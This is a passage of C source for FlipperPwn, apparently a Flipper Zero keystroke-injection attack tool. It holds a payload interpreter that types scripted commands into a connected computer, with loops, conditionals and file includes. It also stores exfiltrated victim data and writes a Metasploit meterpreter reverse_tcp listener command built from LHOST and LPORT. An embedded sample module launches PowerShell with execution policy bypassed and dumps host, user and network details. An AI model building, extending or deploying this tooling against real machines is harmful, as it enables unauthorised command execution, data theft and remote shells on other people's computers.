        /* Absolute path or relative to modules dir */
        if(inject_name[0] == '/') {
            strncpy(inject_path, inject_name, FPWN_PATH_LEN - 1);
            inject_path[FPWN_PATH_LEN - 1] = '\0';
        } else {
            snprintf(inject_path, sizeof(inject_path), "%s/%s", FPWN_MODULES_DIR, inject_name);
        }

        File* inject_file = storage_file_alloc(app->storage);
        if(!storage_file_open(inject_file, inject_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
            FURI_LOG_W(TAG, "INJECT: cannot open %s", inject_path);
            storage_file_free(inject_file);
            return;
        }

        /* Read and execute each line from the injected file.
         * Skip header lines (NAME, DESCRIPTION, etc.) and PLATFORM directives —
         * only execute raw command lines. */
        char inject_line[FPWN_MAX_LINE_LEN];
        while(!storage_file_eof(inject_file) && !app->abort_requested) {
            size_t rn = fpwn_read_line(inject_file, inject_line, sizeof(inject_line));
            if(rn == 0) break;
            char* it = fpwn_trim(inject_line);
            if(it[0] == '\0' || it[0] == '#') continue;
            /* Skip .fpwn headers */
            if(strncmp(it, "NAME ", 5) == 0 || strncmp(it, "DESCRIPTION ", 12) == 0 ||
               strncmp(it, "CATEGORY ", 9) == 0 || strncmp(it, "PLATFORMS ", 10) == 0 ||
               strncmp(it, "OPTION ", 7) == 0 || strncmp(it, "PLATFORM ", 9) == 0) {
                continue;
            }
            fpwn_exec_command(it, app);
            if(s_default_delay_ms > 0) furi_delay_ms(s_default_delay_ms);
        }

        storage_file_close(inject_file);
        storage_file_free(inject_file);
        s_inject_depth--;
        return;
    }

    FURI_LOG_W(TAG, "Unrecognised command: %s", line);
}

/* =========================================================================
 * fpwn_modules_scan
 * ========================================================================= */

void fpwn_modules_scan(FPwnApp* app) {
    furi_assert(app);

    app->module_count = 0;

    Storage* storage = app->storage;
    File* dir = storage_file_alloc(storage);
    File* file = storage_file_alloc(storage);

    if(!storage_dir_open(dir, FPWN_MODULES_DIR)) {
        FURI_LOG_W(TAG, "Cannot open modules dir: %s", FPWN_MODULES_DIR);
        storage_file_free(dir);
        storage_file_free(file);
        return;
    }

    char fname[100]; /* 23 (modules dir) + 1 (/) + 99 = 123 < FPWN_PATH_LEN */
    FileInfo finfo;

    while(app->module_count < FPWN_MAX_MODULES) {
        if(!storage_dir_read(dir, &finfo, fname, sizeof(fname))) break;

        /* Only process .fpwn files */
        size_t flen = strlen(fname);
        if(flen < 6 || strcmp(fname + flen - 5, ".fpwn") != 0) continue;

        /* Build full path */
        FPwnModule* mod = &app->modules[app->module_count];
        memset(mod, 0, sizeof(FPwnModule));

        snprintf(mod->file_path, FPWN_PATH_LEN, "%s/%s", FPWN_MODULES_DIR, fname);

        if(!storage_file_open(file, mod->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
            FURI_LOG_W(TAG, "Cannot open: %s", mod->file_path);
            continue;
        }

        /* Read header lines until we see a blank line, OPTION, or PLATFORM */
        char line[FPWN_MAX_LINE_LEN];
        bool header_done = false;

        while(!header_done) {
            size_t n = fpwn_read_line(file, line, sizeof(line));
            if(n == 0) break;

            char* trimmed = fpwn_trim(line);

            if(strncmp(trimmed, "NAME ", 5) == 0) {
                strncpy(mod->name, trimmed + 5, FPWN_NAME_LEN - 1);
            } else if(strncmp(trimmed, "DESCRIPTION ", 12) == 0) {
                strncpy(mod->description, trimmed + 12, FPWN_DESC_LEN - 1);
            } else if(strncmp(trimmed, "CATEGORY ", 9) == 0) {
                mod->category = fpwn_parse_category(trimmed + 9);
            } else if(strncmp(trimmed, "PLATFORMS ", 10) == 0) {
                mod->platforms = fpwn_parse_platforms(trimmed + 10);
            } else if(strncmp(trimmed, "OPTION ", 7) == 0 || strncmp(trimmed, "PLATFORM ", 9) == 0) {
                /* Reached payload section — stop reading */
                header_done = true;
            }
            /* Empty lines inside the header are allowed; skip them */
        }

        storage_file_close(file);

        /* Require at least a name */
        if(mod->name[0] == '\0') {
            FURI_LOG_W(TAG, "Skipping nameless module: %s", mod->file_path);
            continue;
        }

        FURI_LOG_I(TAG, "Loaded module header: %s", mod->name);
        app->module_count++;
    }

    storage_dir_close(dir);
    storage_file_free(dir);
    storage_file_free(file);

    FURI_LOG_I(TAG, "Scan complete: %lu modules found", (unsigned long)app->module_count);
}

/* =========================================================================
 * fpwn_module_load_full
 * ========================================================================= */

bool fpwn_module_load_full(FPwnApp* app, uint32_t index) {
    furi_assert(app);

    if(index >= app->module_count) return false;

    if((int32_t)index == app->options_loaded_for) return true;

    FPwnModule* module = &app->modules[index];
    Storage* storage = app->storage;
    File* file = storage_file_alloc(storage);

    if(!storage_file_open(file, module->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_E(TAG, "Cannot open for full load: %s", module->file_path);
        storage_file_free(file);
        return false;
    }

    app->active_option_count = 0;
    char line[FPWN_MAX_LINE_LEN];

    while(!storage_file_eof(file)) {
        size_t n = fpwn_read_line(file, line, sizeof(line));
        if(n == 0 && storage_file_eof(file)) break;

        char* trimmed = fpwn_trim(line);

        if(strncmp(trimmed, "OPTION ", 7) != 0) continue;
        if(app->active_option_count >= FPWN_MAX_OPTIONS) break;

        char* rest = trimmed + 7;

        /* Parse name (first token) */
        char* name_end = strchr(rest, ' ');
        if(!name_end) continue;
        *name_end = '\0';
        const char* opt_name = rest;
        rest = name_end + 1;

        /* Parse default value (second token) */
        char* val_end = strchr(rest, ' ');
        const char* opt_default;
        const char* opt_desc = "";

        if(val_end) {
            *val_end = '\0';
            opt_default = rest;
            rest = val_end + 1;

            /* Strip surrounding quotes from description */
            char* desc = rest;
            size_t dlen = strlen(desc);
            if(dlen >= 2 && desc[0] == '"' && desc[dlen - 1] == '"') {
                desc[dlen - 1] = '\0';
                desc++;
            }
            opt_desc = desc;
        } else {
            opt_default = rest;
        }

        FPwnOption* opt = &app->active_options[app->active_option_count];
        strncpy(opt->name, opt_name, FPWN_OPT_NAME_LEN - 1);
        strncpy(opt->value, opt_default, FPWN_OPT_VALUE_LEN - 1);
        strncpy(opt->description, opt_desc, FPWN_OPT_DESC_LEN - 1);
        opt->name[FPWN_OPT_NAME_LEN - 1] = '\0';
        opt->value[FPWN_OPT_VALUE_LEN - 1] = '\0';
        opt->description[FPWN_OPT_DESC_LEN - 1] = '\0';

        FURI_LOG_D(TAG, "  Option: %s = %s", opt->name, opt->value);
        app->active_option_count++;
    }

    storage_file_close(file);
    storage_file_free(file);

    app->options_loaded_for = (int32_t)index;
    FURI_LOG_I(TAG, "Loaded %u option(s) for: %s", app->active_option_count, module->name);
    return true;
}

/* =========================================================================
 * fpwn_payload_execute_thread
 * ========================================================================= */

/**
 * Map the detected/selected OS enum to the PLATFORM keyword used in .fpwn files.
 */
static const char* fpwn_os_to_platform_tag(FPwnOS os) {
    switch(os) {
    case FPwnOSWindows:
        return "PLATFORM WIN";
    case FPwnOSMac:
        return "PLATFORM MAC";
    case FPwnOSLinux:
        return "PLATFORM LINUX";
    default:
        return "PLATFORM WIN"; /* safest fallback */
    }
}

int32_t fpwn_payload_execute_thread(void* ctx) {
    FPwnApp* app = (FPwnApp*)ctx;
    furi_assert(app);
    furi_assert(
        app->selected_module_index >= 0 &&
        (uint32_t)app->selected_module_index < app->module_count);

    /* Reset per-run state so previous payload's state doesn't bleed in */
    s_default_delay_ms = 0;
    s_var_count = 0;
    s_inject_depth = 0;
    memset(s_vars, 0, sizeof(s_vars));

    FPwnModule* module = &app->modules[app->selected_module_index];
    uint32_t start_tick = furi_get_tick();

    /* Determine target OS */
    FPwnOS target_os = (app->manual_os != FPwnOSUnknown) ? app->manual_os : fpwn_os_detect();

    const char* platform_tag = fpwn_os_to_platform_tag(target_os);

    /* Update the OS label in the view model now that detection has run */
    {
        const char* os_str = (target_os == FPwnOSWindows) ? "WIN" :
                             (target_os == FPwnOSMac)     ? "MAC" :
                             (target_os == FPwnOSLinux)   ? "LNX" :
                                                            "???";
        with_view_model(
            app->execute_view,
            FPwnExecModel * m,
            { strncpy(m->os_label, os_str, sizeof(m->os_label) - 1); },
            true);
    }

    FURI_LOG_I(TAG, "Execute: %s  platform: %s", module->name, platform_tag);

    /* --- Phase 1: count lines in the target platform section --- */
    Storage* storage = app->storage;
    File* file = storage_file_alloc(storage);
    uint32_t lines_total = 0;
    bool use_platform_all = false; /* true when falling back to PLATFORM ALL */

    if(!storage_file_open(file, module->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_E(TAG, "Execute: cannot open %s", module->file_path);
        storage_file_free(file);

        /* Mark error in model */
        with_view_model(
            app->execute_view,
            FPwnExecModel * em,
            {
                strncpy(em->status, "Error: cannot open file", sizeof(em->status) - 1);
                em->error = true;
                em->finished = true;
            },
            true);
        return 0;
    }

    {
        char line[FPWN_MAX_LINE_LEN];
        bool in_section = false;

        while(!storage_file_eof(file)) {
            size_t n = fpwn_read_line(file, line, sizeof(line));
            if(n == 0 && storage_file_eof(file)) break;

            char* trimmed = fpwn_trim(line);

            if(!in_section) {
                if(strcmp(trimmed, platform_tag) == 0) in_section = true;
            } else {
                /* A new PLATFORM line ends this section */
                if(strncmp(trimmed, "PLATFORM ", 9) == 0) break;
                if(trimmed[0] != '\0' && trimmed[0] != '#') lines_total++;
            }
        }

        /* If no OS-specific section found, try PLATFORM ALL */
        if(!in_section) {
            storage_file_seek(file, 0, true);
            while(!storage_file_eof(file)) {
                size_t n2 = fpwn_read_line(file, line, sizeof(line));
                if(n2 == 0 && storage_file_eof(file)) break;
                char* trimmed2 = fpwn_trim(line);
                if(!in_section) {
                    if(strcmp(trimmed2, "PLATFORM ALL") == 0) {
                        in_section = true;
                        use_platform_all = true;
                    }
                } else {
                    if(strncmp(trimmed2, "PLATFORM ", 9) == 0) break;
                    if(trimmed2[0] != '\0' && trimmed2[0] != '#') lines_total++;
                }
            }
        }
    }

    storage_file_close(file);

    /* Publish initial progress */
    with_view_model(
        app->execute_view,
        FPwnExecModel * em,
        {
            em->lines_done = 0;
            em->lines_total = lines_total;
            em->finished = false;
            em->error = false;
            strncpy(em->status, "Running...", sizeof(em->status) - 1);
        },
        true);

    /* --- Phase 2: execute --- */
    if(!storage_file_open(file, module->file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_E(TAG, "Execute: reopen failed");
        storage_file_free(file);

        with_view_model(
            app->execute_view,
            FPwnExecModel * em,
            {
                strncpy(em->status, "Error: reopen failed", sizeof(em->status) - 1);
                em->error = true;
                em->finished = true;
            },
            true);
        return 0;
    }

    char raw[FPWN_MAX_LINE_LEN];
    char substituted[FPWN_MAX_LINE_LEN];
    bool in_section = false;
    uint32_t lines_done = 0;

    while(!storage_file_eof(file)) {
        /* Abort check */
        if(app->abort_requested) {
            FURI_LOG_I(TAG, "Execute: aborted by user");
            break;
        }

        size_t n = fpwn_read_line(file, raw, sizeof(raw));
        if(n == 0) break;

        char* trimmed = fpwn_trim(raw);

        if(!in_section) {
            const char* match_tag = use_platform_all ? "PLATFORM ALL" : platform_tag;
            if(strcmp(trimmed, match_tag) == 0) {
                in_section = true;
                FURI_LOG_D(TAG, "Entered section: %s", match_tag);
            }
            continue;
        }

        /* End of section */
        if(strncmp(trimmed, "PLATFORM ", 9) == 0) break;

        /* Skip blank lines and comments (don't count for progress) */
        if(trimmed[0] == '\0' || trimmed[0] == '#') continue;

        /* Substitute template variables then execute */
        fpwn_substitute(
            trimmed,
            substituted,
            sizeof(substituted),
            app->active_options,
            app->active_option_count);

        /* Handle IF_CONNECTED / END_IF conditional blocks.
         * If the ESP32 is not connected, skip everything until END_IF. */
        if(strcmp(substituted, "IF_CONNECTED") == 0) {
            bool esp_ok = app->wifi_uart && fpwn_wifi_uart_is_connected(app->wifi_uart) &&
                          app->marauder;
            if(!esp_ok) {
                /* Skip to matching END_IF */
                int depth = 1;
                while(depth > 0 && !storage_file_eof(file) && !app->abort_requested) {
                    size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                    if(sn == 0) break; /* EOF or I/O error — stop skipping */
                    char* st = fpwn_trim(raw);
                    if(strcmp(st, "IF_CONNECTED") == 0)
                        depth++;
                    else if(strcmp(st, "END_IF") == 0)
                        depth--;
                    if(st[0] != '\0' && st[0] != '#') lines_done++;
                }
                with_view_model(
                    app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
                continue;
            }
            lines_done++;
            continue;
        }
        if(strcmp(substituted, "END_IF") == 0) {
            lines_done++;
            continue;
        }
        if(strcmp(substituted, "ELSE") == 0) {
            /* ELSE reached during normal flow = condition was true, skip to ENDIF */
            lines_done++;
            int depth = 1;
            while(depth > 0 && !storage_file_eof(file) && !app->abort_requested) {
                size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                if(sn == 0) break;
                char* st = fpwn_trim(raw);
                if(strncmp(st, "IF ", 3) == 0 || strcmp(st, "IF_CONNECTED") == 0)
                    depth++;
                else if(strcmp(st, "END_IF") == 0)
                    depth--;
                if(st[0] != '\0' && st[0] != '#') lines_done++;
            }
            with_view_model(
                app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
            continue;
        }

        /* Handle IF $VAR == value / IF $VAR != value — variable conditionals.
         * Format: IF $VAR == value  or  IF $VAR != value
         * Skips to ELSE or END_IF if condition is false. */
        if(strncmp(substituted, "IF ", 3) == 0) {
            const char* expr = substituted + 3;
            bool cond_result = false;

            /* Parse: $VAR op value */
            if(expr[0] == '$') {
                const char* name_start = expr + 1;
                const char* name_end = name_start;
                while((*name_end >= 'A' && *name_end <= 'Z') ||
                      (*name_end >= 'a' && *name_end <= 'z') ||
                      (*name_end >= '0' && *name_end <= '9') || *name_end == '_') {
                    name_end++;
                }
                char vname[FPWN_VAR_NAME_LEN];
                size_t nlen = (size_t)(name_end - name_start);
                if(nlen > FPWN_VAR_NAME_LEN - 1) nlen = FPWN_VAR_NAME_LEN - 1;
                memcpy(vname, name_start, nlen);
                vname[nlen] = '\0';

                const char* op = name_end;
                while(*op == ' ')
                    op++;

                bool is_eq = (strncmp(op, "==", 2) == 0);
                bool is_neq = (strncmp(op, "!=", 2) == 0);

                if(is_eq || is_neq) {
                    const char* val_start = op + 2;
                    while(*val_start == ' ')
                        val_start++;

                    const char* actual = fpwn_var_get(vname);
                    if(!actual) actual = "";

                    bool match = (strcmp(actual, val_start) == 0);
                    cond_result = is_eq ? match : !match;
                }
            }

            if(!cond_result) {
                /* Skip to ELSE or END_IF */
                int depth = 1;
                while(depth > 0 && !storage_file_eof(file) && !app->abort_requested) {
                    size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                    if(sn == 0) break;
                    char* st = fpwn_trim(raw);
                    if(strncmp(st, "IF ", 3) == 0 || strcmp(st, "IF_CONNECTED") == 0) {
                        depth++;
                    } else if(strcmp(st, "ELSE") == 0 && depth == 1) {
                        /* Found our ELSE — start executing from here */
                        break;
                    } else if(strcmp(st, "END_IF") == 0) {
                        depth--;
                    }
                    if(st[0] != '\0' && st[0] != '#') lines_done++;
                }
                with_view_model(
                    app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
            }
            lines_done++;
            continue;
        }

        /* Handle REPEAT_BLOCK <n> / END_REPEAT — loop blocks of commands.
         * Uses file seek to replay the block without buffering lines. */
        if(strncmp(substituted, "REPEAT_BLOCK ", 13) == 0) {
            int reps = atoi(substituted + 13);
            if(reps < 1) reps = 1;
            if(reps > 100) reps = 100; /* safety cap */
            /* Record file position right after REPEAT_BLOCK line */
            uint32_t block_start = (uint32_t)storage_file_tell(file);
            bool block_ok = true; /* false if END_REPEAT not found (I/O error) */
            for(int rep = 0; rep < reps && !app->abort_requested && block_ok; rep++) {
                if(rep > 0) {
                    storage_file_seek(file, block_start, true);
                }
                /* Execute until END_REPEAT */
                bool found_end = false;
                while(!storage_file_eof(file) && !app->abort_requested) {
                    size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                    if(sn == 0) break;
                    char* rt = fpwn_trim(raw);
                    if(rt[0] == '\0' || rt[0] == '#') continue;
                    char rsub[FPWN_MAX_LINE_LEN];
                    fpwn_substitute(
                        rt, rsub, sizeof(rsub), app->active_options, app->active_option_count);
                    if(strcmp(rsub, "END_REPEAT") == 0) {
                        found_end = true;
                        break;
                    }
                    with_view_model(
                        app->execute_view,
                        FPwnExecModel * em,
                        {
                            size_t cl = strlen(rsub);
                            if(cl > sizeof(em->status) - 1) cl = sizeof(em->status) - 1;
                            memcpy(em->status, rsub, cl);
                            em->status[cl] = '\0';
                        },
                        true);
                    fpwn_exec_command(rsub, app);
                    if(s_default_delay_ms > 0) furi_delay_ms(s_default_delay_ms);
                    lines_done++;
                    with_view_model(
                        app->execute_view,
                        FPwnExecModel * em,
                        { em->lines_done = lines_done; },
                        true);
                }
                if(!found_end) block_ok = false; /* I/O error or missing END_REPEAT */
            }
            continue;
        }
        if(strcmp(substituted, "END_REPEAT") == 0) {
            /* Standalone END_REPEAT without matching REPEAT_BLOCK — skip */
            lines_done++;
            continue;
        }

        /* Handle FOR $VAR = start TO end / END_FOR — counted loop.
         * Example: FOR $I = 1 TO 10 ... END_FOR
         * Sets $VAR to start, executes body, increments, repeats until > end. */
        if(strncmp(substituted, "FOR ", 4) == 0) {
            /* Parse: FOR $VAR = start TO end */
            const char* fexpr = substituted + 4;
            if(fexpr[0] == '$') {
                const char* fs = fexpr + 1;
                const char* fe = fs;
                while((*fe >= 'A' && *fe <= 'Z') || (*fe >= 'a' && *fe <= 'z') ||
                      (*fe >= '0' && *fe <= '9') || *fe == '_')
                    fe++;
                char for_var[FPWN_VAR_NAME_LEN];
                size_t fvl = (size_t)(fe - fs);
                if(fvl > FPWN_VAR_NAME_LEN - 1) fvl = FPWN_VAR_NAME_LEN - 1;
                memcpy(for_var, fs, fvl);
                for_var[fvl] = '\0';

                /* Skip " = " */
                const char* fp = fe;
                while(*fp == ' ')
                    fp++;
                if(*fp == '=') fp++;
                while(*fp == ' ')
                    fp++;

                int32_t for_start = (int32_t)atoi(fp);

                /* Find " TO " */
                const char* to_ptr = strstr(fp, " TO ");
                if(!to_ptr) to_ptr = strstr(fp, " to ");
                int32_t for_end = for_start;
                if(to_ptr) {
                    for_end = (int32_t)atoi(to_ptr + 4);
                }

                /* Record file pos for loop body */
                uint32_t for_body_start = (uint32_t)storage_file_tell(file);
                int32_t step = (for_end >= for_start) ? 1 : -1;
                bool for_ok = true;
                int32_t for_iters = 0;
                const int32_t for_max = 10000; /* safety cap */

                for(int32_t fi = for_start; for_iters < for_max && !app->abort_requested && for_ok;
                    fi += step, for_iters++) {
                    /* Bounds check — avoids signed overflow on for_end + step */
                    if((step > 0 && fi > for_end) || (step < 0 && fi < for_end)) break;
                    /* Set loop variable */
                    char fi_buf[16];
                    snprintf(fi_buf, sizeof(fi_buf), "%ld", (long)fi);
                    fpwn_var_set(for_var, fi_buf);

                    if(fi != for_start) {
                        storage_file_seek(file, for_body_start, true);
                    }

                    /* Execute body until END_FOR */
                    bool found_end_for = false;
                    while(!storage_file_eof(file) && !app->abort_requested) {
                        size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                        if(sn == 0) break;
                        char* ft = fpwn_trim(raw);
                        if(ft[0] == '\0' || ft[0] == '#') continue;
                        char fsub[FPWN_MAX_LINE_LEN];
                        fpwn_substitute(
                            ft, fsub, sizeof(fsub), app->active_options, app->active_option_count);
                        if(strcmp(fsub, "END_FOR") == 0) {
                            found_end_for = true;
                            break;
                        }
                        with_view_model(
                            app->execute_view,
                            FPwnExecModel * em,
                            {
                                size_t cl = strlen(fsub);
                                if(cl > sizeof(em->status) - 1) cl = sizeof(em->status) - 1;
                                memcpy(em->status, fsub, cl);
                                em->status[cl] = '\0';
                            },
                            true);
                        fpwn_exec_command(fsub, app);
                        if(s_default_delay_ms > 0) furi_delay_ms(s_default_delay_ms);
                        lines_done++;
                        with_view_model(
                            app->execute_view,
                            FPwnExecModel * em,
                            { em->lines_done = lines_done; },
                            true);
                    }
                    if(!found_end_for) for_ok = false;
                }
                lines_done++;
                with_view_model(
                    app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
            }
            continue;
        }
        if(strcmp(substituted, "END_FOR") == 0) {
            lines_done++;
            continue;
        }

        /* Handle WHILE $VAR == value / END_WHILE — condition-tested loops.
         * Records file position before the body, executes body commands,
         * re-evaluates condition at END_WHILE and seeks back if true.
         * Safety cap: max 1000 iterations to prevent infinite loops. */
        if(strncmp(substituted, "WHILE ", 6) == 0) {
            uint32_t while_start = (uint32_t)storage_file_tell(file);
            int while_iters = 0;
            const int while_max = 1000;
            bool while_active = true;

            while(while_active && !app->abort_requested && while_iters < while_max) {
                /* Evaluate condition: WHILE $VAR == value  or  WHILE $VAR != value */
                const char* wexpr = substituted + 6;
                bool wcond = false;
                if(wexpr[0] == '$') {
                    const char* ws = wexpr + 1;
                    const char* we = ws;
                    while((*we >= 'A' && *we <= 'Z') || (*we >= 'a' && *we <= 'z') ||
                          (*we >= '0' && *we <= '9') || *we == '_')
                        we++;
                    char wn[FPWN_VAR_NAME_LEN];
                    size_t wnl = (size_t)(we - ws);
                    if(wnl > FPWN_VAR_NAME_LEN - 1) wnl = FPWN_VAR_NAME_LEN - 1;
                    memcpy(wn, ws, wnl);
                    wn[wnl] = '\0';
                    const char* wop = we;
                    while(*wop == ' ')
                        wop++;
                    bool weq = (strncmp(wop, "==", 2) == 0);
                    bool wneq = (strncmp(wop, "!=", 2) == 0);
                    if(weq || wneq) {
                        const char* wvs = wop + 2;
                        while(*wvs == ' ')
                            wvs++;
                        const char* wact = fpwn_var_get(wn);
                        if(!wact) wact = "";
                        bool wm = (strcmp(wact, wvs) == 0);
                        wcond = weq ? wm : !wm;
                    }
                }

                if(!wcond) {
                    /* Condition false — skip to END_WHILE */
                    int wdepth = 1;
                    while(wdepth > 0 && !storage_file_eof(file) && !app->abort_requested) {
                        size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                        if(sn == 0) break;
                        char* st = fpwn_trim(raw);
                        if(strncmp(st, "WHILE ", 6) == 0)
                            wdepth++;
                        else if(strcmp(st, "END_WHILE") == 0)
                            wdepth--;
                        if(st[0] != '\0' && st[0] != '#') lines_done++;
                    }
                    while_active = false;
                    break;
                }

                /* Execute body until END_WHILE */
                bool found_end_while = false;
                while(!storage_file_eof(file) && !app->abort_requested) {
                    size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                    if(sn == 0) break;
                    char* wt = fpwn_trim(raw);
                    if(wt[0] == '\0' || wt[0] == '#') continue;
                    char wsub[FPWN_MAX_LINE_LEN];
                    fpwn_substitute(
                        wt, wsub, sizeof(wsub), app->active_options, app->active_option_count);
                    if(strcmp(wsub, "END_WHILE") == 0) {
                        found_end_while = true;
                        break;
                    }
                    with_view_model(
                        app->execute_view,
                        FPwnExecModel * em,
                        {
                            size_t cl = strlen(wsub);
                            if(cl > sizeof(em->status) - 1) cl = sizeof(em->status) - 1;
                            memcpy(em->status, wsub, cl);
                            em->status[cl] = '\0';
                        },
                        true);
                    fpwn_exec_command(wsub, app);
                    if(s_default_delay_ms > 0) furi_delay_ms(s_default_delay_ms);
                    lines_done++;
                    with_view_model(
                        app->execute_view,
                        FPwnExecModel * em,
                        { em->lines_done = lines_done; },
                        true);
                }

                if(!found_end_while) {
                    while_active = false; /* Missing END_WHILE — stop */
                } else {
                    /* Seek back to re-evaluate the condition */
                    storage_file_seek(file, while_start, true);
                    while_iters++;
                }
            }
            continue;
        }
        if(strcmp(substituted, "END_WHILE") == 0) {
            /* Standalone END_WHILE without matching WHILE — skip */
            lines_done++;
            continue;
        }

        /* Update status to show the command being executed */
        with_view_model(
            app->execute_view,
            FPwnExecModel * em,
            {
                size_t cmd_len = strlen(substituted);
                if(cmd_len > sizeof(em->status) - 1) cmd_len = sizeof(em->status) - 1;
                memcpy(em->status, substituted, cmd_len);
                em->status[cmd_len] = '\0';
            },
            true);

        fpwn_exec_command(substituted, app);

        /* Apply default inter-command delay if set by DEFAULTDELAY */
        if(s_default_delay_ms > 0) {
            furi_delay_ms(s_default_delay_ms);
        }

        lines_done++;

        /* LED heartbeat: blink green every 10 commands to show execution is active */
        if(lines_done % 10 == 0) {
            notification_message(app->notifications, &sequence_blink_green_10);
        }

        /* Update progress after completion */
        with_view_model(
            app->execute_view, FPwnExecModel * em, { em->lines_done = lines_done; }, true);
    }

    storage_file_close(file);
    storage_file_free(file);

    /* Mark finished + LED notification */
    {
        bool aborted = app->abort_requested;
        /* Green blink sequence for success, red for abort */
        if(aborted) {
            notification_message(app->notifications, &sequence_blink_red_100);
        } else {
            notification_message(app->notifications, &sequence_blink_green_100);
            furi_delay_ms(100);
            notification_message(app->notifications, &sequence_blink_green_100);
            furi_delay_ms(100);
            notification_message(app->notifications, &sequence_blink_green_100);
        }
        with_view_model(
            app->execute_view,
            FPwnExecModel * em,
            {
                em->lines_done = lines_done;
                em->lines_total = lines_total;
                em->finished = true;
                em->error = false;
                strncpy(em->status, aborted ? "Aborted." : "Done.", sizeof(em->status) - 1);
            },
            true);
    }

    /* Write post-run guide to SD card so the user has a ready reference.
     * Saved to /ext/flipperpwn/last_run.txt — always overwritten. */
    {
        const char* guide_path = EXT_PATH("flipperpwn/last_run.txt");
        File* gf = storage_file_alloc(app->storage);
        if(storage_file_open(gf, guide_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            char buf[320];
            int n;
            uint32_t elapsed_s = (furi_get_tick() - start_tick) / furi_ms_to_ticks(1000);
            n = snprintf(
                buf,
                sizeof(buf),
                "FlipperPwn Last Run\n"
                "===================\n"
                "Module : %s\n"
                "Desc   : %s\n"
                "OS     : %s\n"
                "Lines  : %lu / %lu\n"
                "Elapsed: %lus\n"
                "Status : %s\n"
                "\nOptions\n"
                "-------\n",
                module->name,
                module->description,
                fpwn_os_name(fpwn_effective_os(app)),
                (unsigned long)lines_done,
                (unsigned long)lines_total,
                (unsigned long)elapsed_s,
                app->abort_requested ? "Aborted" : "Complete");
            if(n > 0 && n < (int)sizeof(buf)) storage_file_write(gf, buf, (uint16_t)n);

            for(uint8_t i = 0; i < app->active_option_count; i++) {
                n = snprintf(
                    buf,
                    sizeof(buf),
                    "  %-12s = %s\n",
                    app->active_options[i].name,
                    app->active_options[i].value);
                if(n > 0 && n < (int)sizeof(buf)) storage_file_write(gf, buf, (uint16_t)n);
            }

            /* Append any exfiltrated data captured during this run */
            if(app->exfil_buffer && app->exfil_len > 0) {
                const char* exfil_hdr = "\nExfiltrated Data\n----------------\n";
                storage_file_write(gf, exfil_hdr, (uint16_t)strlen(exfil_hdr));
                uint16_t wlen = (uint16_t)(app->exfil_len > 2048 ? 2048 : app->exfil_len);
                storage_file_write(gf, app->exfil_buffer, wlen);
                const char* nl = "\n";
                storage_file_write(gf, nl, 1);
            }

            /* If LHOST + LPORT are present, write MSF listener command */
            const char* lhost = NULL;
            const char* lport = NULL;
            for(uint8_t i = 0; i < app->active_option_count; i++) {
                if(strcmp(app->active_options[i].name, "LHOST") == 0)
                    lhost = app->active_options[i].value;
                if(strcmp(app->active_options[i].name, "LPORT") == 0)
                    lport = app->active_options[i].value;
            }
            if(lhost && lport) {
                n = snprintf(
                    buf,
                    sizeof(buf),
                    "\nMSF Listener\n"
                    "------------\n"
                    "msfconsole -x \""
                    "use exploit/multi/handler; "
                    "set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
                    "set LHOST %s; "
                    "set LPORT %s; "
                    "exploit\"\n",
                    lhost,
                    lport);
                if(n > 0 && n < (int)sizeof(buf)) storage_file_write(gf, buf, (uint16_t)n);
            }
            storage_file_close(gf);
            FURI_LOG_I(TAG, "Guide written to %s", guide_path);
        }
        storage_file_free(gf);
    }

    FURI_LOG_I(
        TAG,
        "Execute complete: %lu/%lu lines",
        (unsigned long)lines_done,
        (unsigned long)lines_total);
    return 0;
}

/* =========================================================================
 * Sample module bootstrap
 * =========================================================================
 * Sample .fpwn modules are distributed as standalone files alongside the FAP.
 * Copy them to SD:/flipperpwn/modules/ before first use.
 * This function just ensures the modules directory exists.
 * ========================================================================= */

/* Minimal "getting started" module embedded in the binary (~200 bytes).
 * Everything else ships as .fpwn files in the release package. */
static const char SAMPLE_SYSINFO[] =
    "NAME System Info Recon\n"
    "DESCRIPTION Opens terminal, dumps hostname, username, and IP address\n"
    "CATEGORY recon\n"
    "PLATFORMS WIN,MAC,LINUX\n"
    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
    "PLATFORM WIN\n"
    "DELAY {{DELAY}}\n"
    "GUI r\n"
    "DELAY 800\n"
    "STRING powershell -nop -ep bypass\n"
    "ENTER\n"
    "DELAY 1200\n"
    "STRING Write-Host \"HOST:$env:COMPUTERNAME USER:$env:USERNAME\"\n"
    "ENTER\n"
    "DELAY 200\n"
    "STRING ipconfig | Select-String IPv4\n"
    "ENTER\n"
    "DELAY 200\n"
    "STRING $PSVersionTable.PSVersion\n"
    "ENTER\n"
    "PLATFORM MAC\n"
    "DELAY {{DELAY}}\n"
    "GUI SPACE\n"
    "DELAY 700\n"
    "STRING Terminal\n"
    "ENTER\n"
    "DELAY 1400\n"
    "STRING echo HOST:$(hostname) USER:$(whoami) && ifconfig | grep 'inet ' | grep -v 127 && sw_vers\n"
    "ENTER\n"
    "PLATFORM LINUX\n"
    "DELAY {{DELAY}}\n"
    "CTRL ALT t\n"
    "DELAY 1400\n"
    "STRING echo HOST:$(hostname) USER:$(whoami) && ip addr | grep 'inet ' | grep -v 127 && uname -a\n"
    "ENTER\n";

static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
    File* f = storage_file_alloc(storage);
    if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
        storage_file_free(f);
        return false;
    }
    uint32_t len = (uint32_t)strlen(content);
